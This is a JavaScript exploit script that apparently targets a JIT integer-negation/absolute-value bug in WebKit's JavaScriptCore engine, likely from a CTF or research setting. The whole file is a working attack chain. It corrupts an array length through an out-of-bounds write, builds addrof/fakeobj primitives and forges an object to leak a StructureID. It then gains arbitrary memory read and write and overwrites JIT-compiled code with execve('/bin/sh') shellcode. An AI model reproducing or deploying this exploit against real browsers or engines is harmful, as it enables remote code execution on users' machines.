const ITERATIONS = 0x100000000;

const CONVERSION = new ArrayBuffer(8);
const f64 = new Float64Array(CONVERSION);
const u32 = new Uint32Array(CONVERSION);

function f2i(f) {
    f64[0] = f;
    return u32;
}

function i2f(i) {
    u32[0] = i[0];
    u32[1] = i[1];
    return f64[0];
}

function hex(f) {
    let i = f2i(f);
    return "0x" + i[1].toString(16).padStart(8, "0") + i[0].toString(16).padStart(8, "0");
}

function trigger(arr, n) {
    n |= 0; // n is integer
    if (n < 0) { // n is negative integer
        let v = (-n)|0; // ArithNegate
        let i = Math.abs(n); // mathAbs -> ArithAbs -> ArithNegate, i is positive integer
        if (i < arr.length) { // i = INT_MIN, i is always in array bound
            if (i & 0x80000000) {
                i += -0x7ffffffb; // i = 5
            }
            if (i > 0) {
                arr[i] = 1.04380972981885e-310; // 0x1337
            }
        }
    }
}

let noCoW = 13.37;
let target = [noCoW, 1.1, 2.2, 3.3];
let float_arr = [noCoW, 1.1, 2.2, 3.3];
let obj_arr = [{}, {}, {}, {}];

for(let i = 1; i < ITERATIONS; i++) {
    let n = -1;
    trigger(target, n);

    if (i % 0x1000 == 0)
        trigger(target, -2147483648);
    if(float_arr.length == 0x1337)
        break;
}
print("[+] float_arr.length: " + float_arr.length); // 0x1337

function addrof(obj) {
    obj_arr[0] = obj;
    return float_arr[6];
}

function fakeobj(addr) {
    float_arr[6] = addr;
    return obj_arr[0];
}

for(var i = 0; i < 0x10; i++) {
    let arr = [1.1];
    arr["prop_" + i] = 1.1;
} // operationGetByValOptimize()

let leak_arr = [noCoW, 1.1, 2.2, 3.3];
leak_arr.x = 1.1;

let container = {
    jscell_header: i2f([0x00001000, 0x01082307 - 0x20000]),
    butterfly: leak_arr,
};

let container_addr = f2i(addrof(container));
let fake_array_addr = [container_addr[0] + 0x10, container_addr[1]];
let fake_arr = fakeobj(i2f(fake_array_addr));

f64[0] = fake_arr[0];
let structureId = u32[0];
u32[1] = 0x01082307 - 0x20000;
container.jscell_header = f64[0];
print("[+] leaked StructureId: " + structureId);

print("[+] leak_arr: " + describe(leak_arr));
print("[+] fake_arr: " + describe(fake_arr));

function read64(addr) {
    fake_arr[1] = i2f([addr[0] + 0x10, addr[1]]);
    return addrof(leak_arr.x);
}

function write64(addr, value) {
    fake_arr[1] = i2f([addr[0] + 0x10, addr[1]]);
    leak_arr.x = value;
}

let addr = f2i(addrof(trigger));
let addr2 = f2i(read64([addr[0] + 0x18, addr[1]]));
let addr3 = f2i(read64([addr2[0] + 0x8, addr2[1]]));
let jitaddr = f2i(read64([addr3[0] + 0x20, addr3[1]]));
print("[+] JIT Function Code Addr: " + hex(i2f(jitaddr)));

let jitaddr0 = jitaddr[0];
let jitaddr1 = jitaddr[1];

write64([jitaddr0, jitaddr[1]], i2f([0xbb48f631, 0x6e69622f - 0x20000]));
write64([jitaddr0 + 0x8, jitaddr[1]], i2f([0x68732f2f, 0x5f545356 - 0x20000]));
write64([jitaddr0 + 0x10, jitaddr[1]], i2f([0x31583b6a , 0x90050fd2 - 0x20000]));

//Math.atan();
trigger();
